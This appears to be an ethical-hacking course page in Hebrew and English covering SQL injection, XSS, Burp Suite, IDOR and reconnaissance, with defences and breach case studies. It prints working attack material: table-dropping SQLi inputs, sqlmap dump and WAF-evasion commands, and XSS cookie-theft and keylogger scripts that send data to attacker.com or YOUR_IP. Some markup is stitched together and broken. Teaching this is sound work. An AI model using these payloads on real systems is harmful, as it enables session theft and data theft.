<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Red Team — Ethical Hacking</title>
<style>

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg:        #ffffff;
  --bg2:       #f8f9fa;
  --bg3:       #f1f3f5;
  --surface:   #ffffff;
  --border:    #e9ecef;
  --border2:   #dee2e6;
  --accent:    #2d6a4f;
  --accent2:   #e8f5ef;
  --accentfg:  #ffffff;
  --text:      #212529;
  --text2:     #495057;
  --text3:     #868e96;
  --green:     #2f9e44;
  --red:       #e03131;
  --orange:    #e8590c;
  --mono:      'Courier New', 'Consolas', monospace;
  --sans:      -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
  --r:         6px;
  --r2:        12px;
  --shadow:    0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.06);
  --shadow2:   0 4px 12px rgba(0,0,0,.10);
}

html, body { height: 100%; font-family: var(--sans); background: var(--bg); color: var(--text); font-size: 15px; line-height: 1.6; -webkit-font-smoothing: antialiased; }

/* ── HEADER ── */
.header {
  position: fixed; top: 0; left: 0; right: 0; height: 56px; z-index: 200;
  background: var(--bg); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; padding: 0 20px; gap: 16px;
}
.header-logo {
  font-weight: 700; font-size: 15px; color: var(--text);
  display: flex; align-items: center; gap: 8px; flex-shrink: 0;
}
.header-logo-dot {
  width: 8px; height: 8px; border-radius: 50%; background: var(--accent);
}
.header-chname { font-size: 13px; color: var(--text3); flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.lang-btn {
  font-size: 12px; font-weight: 600; padding: 5px 12px; border-radius: var(--r);
  border: 1px solid var(--border2); background: var(--bg2); color: var(--text2);
  cursor: pointer; flex-shrink: 0; transition: all .15s;
}
.lang-btn:hover { background: var(--accent); color: var(--accentfg); border-color: var(--accent); }
.menu-btn { display: none; background: none; border: none; cursor: pointer; padding: 6px; color: var(--text2); }

/* ── CHAPTER NAV BAR ── */
.ch-nav {
  position: fixed; top: 56px; left: 0; right: 0; z-index: 150;
  background: var(--bg); border-bottom: 1px solid var(--border);
  overflow-x: auto; display: flex; padding: 0 20px; gap: 4px;
  scrollbar-width: none; -ms-overflow-style: none;
}
.ch-nav::-webkit-scrollbar { display: none; }
.ch-btn {
  display: flex; flex-direction: column; align-items: center;
  padding: 8px 14px 6px; gap: 2px; border: none; background: none;
  cursor: pointer; border-bottom: 2px solid transparent;
  color: var(--text3); transition: all .15s; flex-shrink: 0; min-width: 56px;
}
.ch-btn:hover { color: var(--text2); background: var(--bg2); }
.ch-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
.ch-num { font-size: 11px; font-weight: 700; font-family: var(--mono); }
.ch-title-text { font-size: 10px; max-width: 72px; text-align: center; line-height: 1.2; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; }
.ch-stars { font-size: 9px; color: var(--orange); min-height: 10px; }

/* ── LAYOUT ── */
.main { padding-top: 104px; min-height: 100vh; max-width: 900px; margin: 0 auto; padding-left: 24px; padding-right: 24px; padding-bottom: 60px; }

/* ── CHAPTER SECTION ── */
.chapter { display: none; }
.chapter.active { display: block; }

/* ── CHAPTER HERO ── */
.ch-hero {
  padding: 36px 0 28px; border-bottom: 1px solid var(--border); margin-bottom: 32px;
}
.ch-tag { font-size: 11px; font-weight: 700; color: var(--accent); letter-spacing: .08em; text-transform: uppercase; margin-bottom: 8px; font-family: var(--mono); }
.ch-title { font-size: 28px; font-weight: 800; line-height: 1.2; color: var(--text); margin-bottom: 10px; letter-spacing: -.02em; }
.ch-desc { font-size: 14px; color: var(--text3); line-height: 1.5; max-width: 580px; margin-bottom: 20px; }
.tabs-bar { display: flex; gap: 4px; }
.tab-btn {
  padding: 7px 16px; font-size: 13px; font-weight: 500; border-radius: var(--r);
  border: 1px solid transparent; background: var(--bg3); color: var(--text3);
  cursor: pointer; transition: all .15s;
}
.tab-btn:hover { background: var(--bg2); color: var(--text2); border-color: var(--border2); }
.tab-btn.active { background: var(--accent); color: var(--accentfg); border-color: var(--accent); }

/* ── TAB PANELS ── */
.tab-panels { }
.tab-panel { display: none; }
.tab-panel.active { display: block; }

/* ── LEARN CONTENT ── */
.did-you-know {
  background: var(--bg2); border-left: 3px solid var(--accent);
  padding: 14px 16px; border-radius: 0 var(--r) var(--r) 0;
  font-size: 13.5px; color: var(--text2); margin-bottom: 28px; line-height: 1.6;
}
.section-title {
  font-size: 18px; font-weight: 700; color: var(--text); margin: 32px 0 12px;
  letter-spacing: -.01em;
}
.section-title:first-of-type { margin-top: 0; }
.prose {
  font-size: 15px; color: var(--text2); line-height: 1.75; margin-bottom: 14px;
}
.prose code, code {
  font-family: var(--mono); font-size: 12.5px; background: var(--bg3);
  padding: 1px 5px; border-radius: 3px; color: var(--text);
}

/* ── CODE BLOCKS ── */
.code-block {
  background: #1e1e2e; border-radius: var(--r2); padding: 18px 20px;
  margin: 16px 0; overflow-x: auto;
}
.code-block code {
  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
  background: none; padding: 0; color: #cdd6f4; display: block;
}
.comment { color: #6c7086; }
.key { color: #89b4fa; }
.str { color: #a6e3a1; }
.val { color: #fab387; }

/* ── GRID ── */
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 16px 0 24px; }
.grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin: 16px 0 24px; }

/* ── CARDS ── */
.card {
  background: var(--bg); border: 1px solid var(--border); border-radius: var(--r2);
  padding: 18px; display: flex; flex-direction: column; gap: 6px;
  box-shadow: var(--shadow);
}
.card-icon { font-size: 22px; }
.card-title { font-size: 13px; font-weight: 700; color: var(--text); }
.card-body { font-size: 13px; color: var(--text3); line-height: 1.55; }

/* ── TABLE ── */
.table-wrap { overflow-x: auto; margin: 16px 0 24px; border-radius: var(--r2); border: 1px solid var(--border); box-shadow: var(--shadow); }
.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.data-table thead { background: var(--bg3); }
.data-table th { padding: 10px 14px; text-align: left; font-weight: 600; color: var(--text2); font-size: 12px; text-transform: uppercase; letter-spacing: .04em; border-bottom: 1px solid var(--border); }
.data-table td { padding: 10px 14px; color: var(--text2); border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
.data-table tr:last-child td { border-bottom: none; }
.data-table tr:hover td { background: var(--bg2); }

/* ── FLOW ── */
.flow-row { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; margin: 16px 0 24px; padding: 20px; background: var(--bg2); border-radius: var(--r2); border: 1px solid var(--border); }
.flow-step { display: flex; flex-direction: column; align-items: center; gap: 4px; text-align: center; }
.flow-step-icon { font-size: 22px; }
.flow-step-label { font-size: 10px; color: var(--text3); line-height: 1.3; max-width: 64px; }
.flow-arrow { color: var(--accent); font-size: 16px; font-weight: 700; flex-shrink: 0; }

/* ── CALLOUTS ── */
.callout { padding: 12px 16px; border-radius: var(--r); font-size: 13.5px; line-height: 1.6; margin: 16px 0; }
.callout-info { background: #eff6ff; border-left: 3px solid #3b82f6; color: #1e40af; }
.callout-warn { background: #fffbeb; border-left: 3px solid #f59e0b; color: #92400e; }
.callout-tip  { background: #f0fdf4; border-left: 3px solid #22c55e; color: #14532d; }
.callout-success { background: var(--bg2); border: 1px solid var(--border); color: var(--text2); border-radius: var(--r); padding: 10px 14px; margin-bottom: 14px; }

/* ── REAL-WORLD BOX ── */
.real-world-box {
  background: var(--bg); border: 1px solid var(--border);
  border-radius: var(--r2); padding: 20px; margin: 24px 0;
  box-shadow: var(--shadow);
}
.real-world-title { font-size: 13px; font-weight: 700; color: var(--accent); margin-bottom: 10px; }
.real-world-body { font-size: 13.5px; color: var(--text2); line-height: 1.7; }

/* ── BADGE ── */
.badge { display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 7px; border-radius: 20px; font-family: var(--mono); }
.badge-new  { background: #dcfce7; color: #166534; }
.badge-hot  { background: #fee2e2; color: #991b1b; }
.badge-exp  { background: #fffbeb; color: #92400e; }
.badge-prod { background: #eff6ff; color: #1e40af; }

/* ── CHEAT SHEET ── */
.cheat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 12px; margin-top: 8px; }
.cheat-card { background: var(--bg); border: 1px solid var(--border); border-radius: var(--r); padding: 14px; }
.cheat-card-title { font-size: 12px; font-weight: 700; color: var(--accent); margin-bottom: 10px; text-transform: uppercase; letter-spacing: .06em; font-family: var(--mono); }
.cheat-item { display: flex; justify-content: space-between; gap: 8px; padding: 4px 0; border-bottom: 1px solid var(--border); font-size: 12.5px; }
.cheat-item:last-child { border-bottom: none; }
.cheat-key { font-family: var(--mono); color: var(--accent); font-weight: 600; font-size: 11.5px; flex-shrink: 0; }
.cheat-val { color: var(--text3); text-align: right; font-size: 11.5px; }

/* ── GAME ── */
.game-start-card { max-width: 420px; margin: 0 auto; text-align: center; padding: 48px 24px; }
.game-icon { font-size: 48px; margin-bottom: 16px; }
.game-start-title { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 8px; letter-spacing: -.02em; }
.game-start-desc { font-size: 14px; color: var(--text3); margin-bottom: 24px; }
.game-rules { display: flex; justify-content: center; gap: 24px; margin-bottom: 28px; }
.game-rule { font-size: 13px; color: var(--text2); }
.btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 22px; border-radius: var(--r); font-size: 14px; font-weight: 600; border: none; cursor: pointer; transition: all .15s; }
.btn-primary { background: var(--accent); color: var(--accentfg); }
.btn-primary:hover { opacity: .9; transform: translateY(-1px); box-shadow: var(--shadow2); }
.btn-ghost { background: var(--bg2); color: var(--text2); border: 1px solid var(--border2); }
.btn-ghost:hover { background: var(--bg3); }
.game-hud { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding: 12px 16px; background: var(--bg2); border-radius: var(--r); border: 1px solid var(--border); }
.hud-score { font-size: 20px; font-weight: 800; color: var(--accent); font-family: var(--mono); }
.hud-timer { font-size: 14px; font-weight: 600; color: var(--text2); font-family: var(--mono); }
.game-q-text { font-size: 17px; font-weight: 600; color: var(--text); margin-bottom: 20px; line-height: 1.5; }
.game-opts { display: flex; flex-direction: column; gap: 10px; }
.game-opt {
  display: flex; align-items: center; gap: 12px;
  padding: 14px 16px; border-radius: var(--r); border: 1.5px solid var(--border);
  background: var(--bg); cursor: pointer; transition: all .15s;
  font-size: 14px; color: var(--text2); font-weight: 500;
}
.game-opt:hover { border-color: var(--accent); color: var(--text); background: var(--bg2); }
.game-opt.correct { border-color: var(--green); background: #f0fdf4; color: var(--green); }
.game-opt.wrong   { border-color: var(--red); background: #fff1f2; color: var(--red); }
.opt-letter { width: 24px; height: 24px; border-radius: 50%; background: var(--bg3); display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; color: var(--text3); font-family: var(--mono); }
.game-result-card { max-width: 420px; margin: 40px auto 0; text-align: center; }
.result-score { font-size: 56px; font-weight: 900; color: var(--accent); font-family: var(--mono); margin-bottom: 4px; }
.result-label { font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 24px; }
.result-btns { display: flex; gap: 10px; justify-content: center; }

/* ── QUIZ ── */
.quiz-wrap { max-width: 680px; }
.quiz-progress { display: flex; gap: 4px; margin-bottom: 24px; }
.quiz-prog-dot { flex: 1; height: 3px; border-radius: 2px; background: var(--border2); }
.quiz-prog-dot.done { background: var(--accent); }
.quiz-prog-dot.current { background: var(--accent); opacity: .5; }
.quiz-q-text { font-size: 17px; font-weight: 600; color: var(--text); margin-bottom: 20px; line-height: 1.5; }
.quiz-opts { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
.quiz-opt {
  display: flex; align-items: center; gap: 12px;
  padding: 13px 16px; border-radius: var(--r); border: 1.5px solid var(--border);
  background: var(--bg); cursor: pointer; transition: all .15s;
  font-size: 14px; color: var(--text2);
}
.quiz-opt:hover { border-color: var(--accent); }
.quiz-opt.selected { border-color: var(--accent); background: var(--bg2); color: var(--text); }
.quiz-opt.correct { border-color: var(--green); background: #f0fdf4; }
.quiz-opt.wrong   { border-color: var(--red); background: #fff1f2; }
.quiz-explain { padding: 12px 16px; background: var(--bg2); border-radius: var(--r); font-size: 13.5px; color: var(--text2); margin: 12px 0; line-height: 1.6; border-left: 3px solid var(--accent); }
.quiz-actions { display: flex; gap: 10px; }
.quiz-result { text-align: center; padding: 40px 20px; }
.qr-score { font-size: 52px; font-weight: 900; font-family: var(--mono); color: var(--accent); }
.qr-label { font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 24px; }

/* ── LAB ── */
.lab-wrap { max-width: 720px; }

/* ── CREDITS ── */
.credits-bar { border-top: 1px solid var(--border); padding: 32px 0; margin-top: 48px; }
.credits-title { font-size: 10px; font-weight: 700; color: var(--accent); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 16px; font-family: var(--mono); }
.credits-grid { display: flex; flex-wrap: wrap; gap: 24px; }
.credit-group { flex: 1; min-width: 140px; }
.credit-group-title { font-size: 11px; font-weight: 700; color: var(--text2); margin-bottom: 8px; }
.credit-item { font-size: 12px; color: var(--text3); line-height: 1.8; }
.credit-item a { color: var(--accent); text-decoration: none; }
.credit-item a:hover { text-decoration: underline; }

/* ── MOBILE ── */
@media (max-width: 700px) {
  .main { padding-top: 100px; padding-left: 16px; padding-right: 16px; }
  .ch-title { font-size: 22px; }
  .grid-2, .grid-3 { grid-template-columns: 1fr; }
  .menu-btn { display: block; }
  .flow-row { gap: 4px; padding: 14px; }
  .flow-step-label { font-size: 9px; max-width: 54px; }
  .game-rules { gap: 14px; }
  .quiz-actions { flex-wrap: wrap; }
}
@media (max-width: 480px) {
  .ch-nav { padding: 0 12px; }
  .ch-btn { padding: 8px 10px; min-width: 46px; }
  .ch-title-text { max-width: 56px; font-size: 9px; }
}

</style>
</head>

<div class="section-title">כיצד SQLi עובד — הבסיס</div>
<p class="prose">SQL Injection קורה כשאפליקציה בונה SQL query על ידי חיבור string input מהמשתמש — ישירות, ללא sanitization. הquery "בורחת" מהכוונה המקורית ומריצה code של התוקף. זה לא exploit מתוחכם — זה שימוש לרעה בdynamic SQL בדיוק כמו שהוא אמור לעבוד.</p>
<pre class="code-block"><code><span class="comment"># Vulnerable code</span>
query = "SELECT * FROM users WHERE name='" + user_input + "'"

<span class="comment"># Input: ' OR '1'='1</span>
<span class="comment"># Query becomes:</span>
SELECT * FROM users WHERE name='' OR '1'='1'
<span class="comment"># ← מחזיר כל המשתמשים!</span>

<span class="comment"># Input: '; DROP TABLE users; --</span>
SELECT * FROM users WHERE name=''; DROP TABLE users; --'
<span class="comment"># ← מוחק את הטבלה!</span>

<span class="comment"># Safe code</span>
cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))</code></pre>

<div class="section-title">סוגי SQLi</div>
<div class="grid-2">
<div class="card"><div class="card-icon">👁️</div><div class="card-title">Union-Based</div><div class="card-body">מחבר UNION SELECT לquery המקורית ומחזיר נתונים בresponse. צריך לדעת כמה columns בquery המקורית. הכי ישיר — אם error לא מוסתר.</div></div>
<div class="card"><div class="card-icon">❌</div><div class="card-title">Error-Based</div><div class="card-body">מגרה SQL error שמכיל מידע. extractvalue() ו-updatexml() ב-MySQL מחזירות data ב-error message. עובד כשerrors מוצגים למשתמש.</div></div>

<div class="section-title">כיצד XSS עובד</div>
<p class="prose">XSS (Cross-Site Scripting) מאפשר לתוקף להזריק JavaScript לדף אינטרנט שנטען ב-browser של קורבן אחר. ה-browser של הקורבן מריץ את הscript כאילו הוא חלק לגיטימי מהאתר — כי הוא כן, מבחינת ה-browser. השוני מSQL Injection: SQLi תוקף את ה-database. XSS תוקף את המשתמשים של האתר.</p>

<div class="section-title">שלושת סוגי XSS</div>
<div class="grid-3">
<div class="card"><div class="card-icon">↩️</div><div class="card-title">Reflected XSS</div><div class="card-body">Payload נשלח בURL, server משקף אותו ב-response. קורבן צריך ללחוץ על link זדוני. לא שמור ב-DB. Example: <code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></div></div>
<div class="card"><div class="card-icon">💾</div><div class="card-title">Stored XSS</div><div class="card-body">Payload נשמר ב-DB (comment, username, profile). כל user שרואה את הcontent — מריץ את ה-script. הכי מסוכן: לא צריך להפנות קורבן לlink.</div></div>
<div class="card"><div class="card-icon">🌐</div><div class="card-title">DOM XSS</div><div class="card-body">JavaScript בdצד לקוח קורא URL param ומכניס לDOM בלי sanitization. Server לא רואה את ה-payload. לא ניתן לזהות ב-server logs. ה-browser מריץ ישירות.</div></div>

<div class="section-title">Burp Suite Architecture</div>
<p class="prose">Burp Suite הוא proxy שיושב בין הbrowser שלך לאינטרנט. הbrowser שלך מוגדר להשתמש ב-127.0.0.1:8080 כproxy. כל HTTP/HTTPS request עובר דרך Burp לפני שמגיע לserver. Burp מציג אותו, מאפשר לשנות, ולשלוח הלאה — או לעצור ולנתח. זה נותן שליטה מלאה על כל ה-web traffic שלך.</p>
<p class="prose">לHTTPS: Burp מתקין CA certificate שלו ב-browser. browser מאמין ל-Burp, Burp פותח ומסגר TLS עם browser, פותח TLS חדש עם server. MiTM controlled בכוונה. CA cert חייב להיות מותקן ב-browser לפני שמתחילים.</p>

<p class="prose">IDOR הוא פגיעות שבה API endpoint מחזיר data על ידי ID — ולא מאמת שה-user יכול לגשת לאותו ID. /api/user/123 מחזיר profile של user 123. מה קורה אם שולחים /api/user/124? אם מחזיר profile של user אחר — IDOR. Repeater הוא הכלי לבדוק את זה.</p>

`<div class="did-you-know">💡 <strong>Did you know?</strong> 90% of the information a red teamer needs about an organization is available on Google, LinkedIn, GitHub, and Shodan — before touching a single server. "Google Dorking" — advanced search queries — frequently exposes config files with passwords, open admin panels, and old backup files that nobody knew were public.</div>

<div class="section-title">Passive vs Active Reconnaissance</div>
<p class="prose">Passive recon collects information from public sources without sending a single packet to the target. Active recon sends packets directly to the target. The difference is critical: passive cannot be detected, active can trigger IDS/firewall alerts. Most engagements begin with passive to learn as much as possible before touching the target.</p>

<div class="section-title">Google Dorking</div>
<pre class="code-block"><code><span class="comment"># Google Dorks — find sensitive information</span>
site:company.com filetype:pdf              <span class="comment"># all PDFs</span>
site:company.com inurl:admin               <span class="comment"># admin panels</span>
site:company.com ext:env OR ext:cfg        <span class="comment"># config files</span>
"company.com" "DB_PASSWORD"               <span class="comment"># database passwords</span>
intitle:"index of" site:company.com       <span class="comment"># directory listings</span>
site:github.com "company.com" password    <span class="comment"># secrets on GitHub</span>

<span class="comment"># Shodan — search engine for internet devices</span>
<span class="comment"># shodan.io — search:</span>
org:"Company Name"       <span class="comment"># all company servers</span>
hostname:company.com     <span class="comment"># by hostname</span>
"default password"       <span class="comment"># devices with default credentials!</span>
port:3306 country:IL     <span class="comment"># MySQL exposed in Israel</span></code></pre>

<div class="section-title">Nmap — Port Scanning</div>
<p class="prose">Nmap is the standard port scanning tool. It sends various packets to ports and analyzes responses. Important: against targets without authorization — this is legally different in every country. Always in a lab environment under your control or with written permission.</p>
<pre class="code-block"><code><span class="comment"># Nmap scan types</span>
nmap -sn 192.168.1.0/24          <span class="comment"># ping scan — who is alive?</span>
nmap -sV -sC 192.168.1.100       <span class="comment"># version + default scripts</span>
nmap -p- 192.168.1.100           <span class="comment"># all 65535 ports</span>
nmap -O 192.168.1.100            <span class="comment"># OS detection</span>
nmap -A 192.168.1.100            <span class="comment"># aggressive: all of above</span>
nmap -sS 192.168.1.100           <span class="comment"># SYN scan (stealth)</span>

<span class="comment"># Save results</span>
nmap -sV 192.168.1.0/24 -oA scan_output
<span class="comment"># Creates: scan_output.nmap, .gnmap, .xml</span>

<span class="comment"># DNS + Subdomain Enum</span>
subfinder -d company.com -o subs.txt
amass enum -passive -d company.com</code></pre>

<div class="real-world-box">
  <div class="real-world-title">🌍 OSINT Case: GitHub Secrets Leak</div>
  <div class="real-world-body">

    Tools like truffleHog and gitleaks scan repos for passwords. When found — attackers run them live, steal AWS keys, S3 buckets, and production databases. The fix: git history cannot be deleted — you must rotate credentials, not just delete the commit.
  </div>
</div>

<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>

<span class="comment"># .nmap = human readable</span>

<span class="comment"># .gnmap = for grep</span>

trufflehog github --org=targetorg --json > recon/github_secrets.json</code></pre>

<div class="callout callout-tip"><strong>💡 Golden rule:</strong> Document everything in real time. When you find something interesting — timestamp + what you found + the command you ran. Reports are written at the end from logs, not from memory.</div>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> SQL Injection was discovered in 1998 and still ranks in the OWASP Top 3 in 2025. In 2024 alone, SQLi caused breaches at Microsoft, Oracle, and dozens of SaaS startups. Why does it not disappear? Because developers still write string concatenation in SQL queries. Takes 5 seconds to write wrong, years to detect.</div>

<div class="section-title">How SQLi Works — The Basics</div>
<p class="prose">SQL Injection occurs when an application builds a SQL query by concatenating user input directly — without sanitization. The query "escapes" the original intent and executes the attacker's code. This is not a sophisticated exploit — it is misusing dynamic SQL exactly as it was designed to work.</p>
<pre class="code-block"><code><span class="comment"># Vulnerable code</span>
query = "SELECT * FROM users WHERE name='" + user_input + "'"

<span class="comment"># Input: ' OR '1'='1</span>
<span class="comment"># Query becomes:</span>
SELECT * FROM users WHERE name='' OR '1'='1'
<span class="comment"># returns all users!</span>

<span class="comment"># Input: '; DROP TABLE users; --</span>
SELECT * FROM users WHERE name=''; DROP TABLE users; --'
<span class="comment"># deletes the table!</span>

<span class="comment"># Safe code</span>
cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))</code></pre>

<div class="section-title">Types of SQLi</div>
<div class="grid-2">
<div class="card"><div class="card-icon">👁️</div><div class="card-title">Union-Based</div><div class="card-body">Appends UNION SELECT to the original query and returns data in the response. Need to know how many columns are in the original query. Most direct — if errors are not hidden.</div></div>
<div class="card"><div class="card-icon">❌</div><div class="card-title">Error-Based</div><div class="card-body">Triggers SQL errors that contain information. extractvalue() and updatexml() in MySQL return data inside error messages. Works when errors are shown to the user.</div></div>
<div class="card"><div class="card-icon">🦯</div><div class="card-title">Blind Boolean</div><div class="card-body">"Does the admin password start with 'a'?" — sends query, response differs for true/false. Slow but works even when errors are hidden.</div></div>
<div class="card"><div class="card-icon">⏱️</div><div class="card-title">Time-Based Blind</div><div class="card-body">SLEEP(5) if true — if the response is delayed 5 seconds, the condition is correct. Slowest — works even when response is identical in all cases.</div></div>
</div>

<div class="section-title">sqlmap — Automation (on authorized targets only!)</div>
<pre class="code-block"><code><span class="comment"># sqlmap — automated SQLi detection and exploitation</span>
<span class="comment"># ONLY on authorized targets!</span>

sqlmap -u "http://target.com/user?id=1" --dbs       <span class="comment"># list databases</span>
sqlmap -u "http://target.com/user?id=1"        -D webapp --tables                            <span class="comment"># list tables</span>
sqlmap -u "http://target.com/user?id=1"        -D webapp -T users --dump                    <span class="comment"># dump table</span>

<span class="comment"># With cookies (authenticated)</span>
sqlmap -u "http://target.com/profile?id=5"        --cookie="session=abc123" --level=3</code></pre>

<div class="real-world-box">
  <div class="real-world-title">🌍 Equifax 2017 — 147M Records, SQL Injection</div>
  <div class="real-world-body">
    The Equifax breach (2017) that exposed credit data of 147 million Americans was a combination of SQLi in a web portal and a missing patch for Apache Struts. The attacker used CVE-2017-5638 (RCE in Struts) to get in, then SQLi to exfiltrate the database.<br><br>
    The simple defenses that would have prevented everything: parameterized queries + WAF + patching Struts (which had been available 2 months earlier). Cost of negligence: $575M FTC settlement, +$1.4B in security upgrades.
  </div>
</div>

<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>

<p class="prose">SQL injection testing starts manually and moves to automated only after confirming a vulnerability exists. Running sqlmap against every endpoint generates a lot of noise and can disrupt production.</p>

<div class="section-title">Initial Manual Testing</div>
<pre class="code-block"><code><span class="comment"># In every input field/parameter — try:</span>
'                    <span class="comment"># single quote — error?</span>
''                   <span class="comment"># escaped quote</span>
1'--                 <span class="comment"># comment out the rest</span>
1 OR 1=1             <span class="comment"># boolean test</span>
1 AND SLEEP(5)       <span class="comment"># time-based test (waits 5 seconds?)</span>

<span class="comment"># In URL parameters:</span>
https://target.com/user?id=1'
https://target.com/user?id=1 ORDER BY 10--
<span class="comment"># "Unknown column '10'" → vulnerable, fewer than 10 columns</span>

<span class="comment"># In Burp Suite — change param and watch the response</span>
<span class="comment"># Error message = error-based SQLi</span>
<span class="comment"># Changed response length = boolean-based</span>
<span class="comment"># Response delay = time-based</span></code></pre>

<div class="section-title">sqlmap — After Confirming Vulnerability</div>
<pre class="code-block"><code><span class="comment"># Basic — confirms SQLi and shows databases</span>
sqlmap -u "https://target.com/user?id=1" --dbs --batch

<span class="comment"># With Burp intercept (save request to file)</span>
<span class="comment"># Burp ← Save item ← req.txt</span>
sqlmap -r req.txt --dbs --batch

<span class="comment"># Dump users table</span>
sqlmap -u "https://target.com/user?id=1" -D webapp -T users --dump --batch

<span class="comment"># WAF blocking? Try evasion</span>
sqlmap -u "https://target.com/user?id=1" --tamper=space2comment,between --dbs</code></pre>

<div class="section-title">What to Include in the Report</div>
<p class="prose">For every SQLi finding: full request (method, URL, headers, body), response that proves exploitation (error message, returned data), CVSS score, and remediation — parameterized queries with a code example in the relevant language.</p>`,
`<div class="did-you-know">💡 <strong>Did you know?</strong> XSS is the most common vulnerability in web applications — according to HackerOne, 25% of all Bug Bounty reports are XSS. British Airways (2018) suffered from Stored XSS in a payment form planted by a Magecart skimming script — 500,000 customers, credit card details stolen, fine of £20M.</div>

<div class="section-title">How XSS Works</div>
<p class="prose">XSS (Cross-Site Scripting) lets an attacker inject JavaScript into a web page loaded in another victim's browser. The victim's browser runs the script as if it were a legitimate part of the site — because from the browser's perspective, it is. The difference from SQL Injection: SQLi attacks the database. XSS attacks the site's users.</p>

<div class="section-title">The Three Types of XSS</div>
<div class="grid-3">
<div class="card"><div class="card-icon">↩️</div><div class="card-title">Reflected XSS</div><div class="card-body">Payload is sent in the URL, server reflects it in the response. Victim needs to click a malicious link. Not stored in DB. Example: <code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></div></div>
<div class="card"><div class="card-icon">💾</div><div class="card-title">Stored XSS</div><div class="card-body">Payload is saved in the DB (comment, username, profile). Every user who sees the content runs the script. Most dangerous: no need to direct a victim to a link.</div></div>
<div class="card"><div class="card-icon">🌐</div><div class="card-title">DOM XSS</div><div class="card-body">Client-side JavaScript reads a URL param and inserts it into the DOM without sanitization. Server never sees the payload. Cannot be detected in server logs. Browser executes directly.</div></div>
</div>

<div class="section-title">XSS — What You Can Do With It</div>
<pre class="code-block"><code><span class="comment"># Cookie Theft — stealing sessions</span>
&lt;script&gt;
document.location='http://attacker.com/steal?c='+document.cookie
&lt;/script&gt;
<span class="comment"># every session cookie is sent to the attacker</span>

<span class="comment"># Keylogger</span>
&lt;script&gt;
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?k='+e.key)
}
&lt;/script&gt;

<span class="comment"># CSP bypass attempts</span>
&lt;img src=x onerror=alert(1)&gt;       <span class="comment"># attribute injection</span>
&lt;svg/onload=alert(1)&gt;              <span class="comment"># SVG vector</span></code></pre>

<div class="section-title">Defenses — CSP and More</div>
<p class="prose">Content Security Policy (CSP) is an HTTP header that restricts where scripts can run. <code>Content-Security-Policy: script-src 'self'</code> means: only scripts from our own domain. Inline scripts are blocked. Script from attacker.com — blocked. CSP is the best defense against XSS — but also the hardest to configure correctly.</p>

<div class="real-world-box">
  <div class="real-world-title">🌍 Samy Worm — XSS That Infected a Million Accounts in 20 Hours</div>
  <div class="real-world-body">
    2005: Samy Kamkar wrote an XSS worm on MySpace. The payload: (1) add Samy as a friend, (2) display "but most of all, samy is my hero" on the profile, (3) copy the payload to the current user's profile. Every visitor to an infected profile became infected.<br><br>
    In 20 hours: one million accounts added Samy as a friend. MySpace was forced to shut down. Samy was arrested, receiving 3 years home confinement and 90 hours community service. Proof that Stored XSS is genuinely dangerous.
  </div>
</div>

<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>

<p class="prose">XSS testing requires checking every input point, including headers and JSON parameters that are not directly visible. Burp Scanner catches some — manual testing catches the rest.</p>

<div class="section-title">XSS Payloads for Testing</div>
<pre class="code-block"><code><span class="comment"># Simple — initial detection</span>
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;

<span class="comment"># If script tags are filtered</span>
&lt;img src=x onerror="alert\`1\`"&gt;
&lt;details open ontoggle=alert(1)&gt;
javascript:alert(1)     <span class="comment"># in href attribute</span>

<span class="comment"># DOM XSS — check URL fragment</span>
https://target.com/search#&lt;img src=x onerror=alert(1)&gt;

<span class="comment"># In JSON API (Content-Type: application/json)</span>
{"name": "&lt;script&gt;alert(1)&lt;/script&gt;"}
<span class="comment"># If response is rendered in HTML context — XSS</span></code></pre>

<div class="section-title">Proof of Concept — Cookie Theft</div>
<pre class="code-block"><code><span class="comment"># Setup listener (in lab/authorized environment)</span>
<span class="comment"># 1. Start simple HTTP server:</span>
python3 -m http.server 8080

<span class="comment"># 2. XSS payload for cookie theft:</span>
&lt;script&gt;
new Image().src='http://YOUR_IP:8080/steal?c='+document.cookie;
&lt;/script&gt;

<span class="comment"># 3. When victim loads page — server log shows:</span>
<span class="comment"># GET /steal?c=session=abc123; user=admin HTTP/1.1</span>

<span class="comment"># PoC that proves impact without real harm</span>
&lt;script&gt;alert('XSS by [your name] - Bug ID: 12345')&lt;/script&gt;
<span class="comment"># A screenshot of this is sufficient for the report</span></code></pre>

<div class="section-title">CSP Bypass Testing</div>
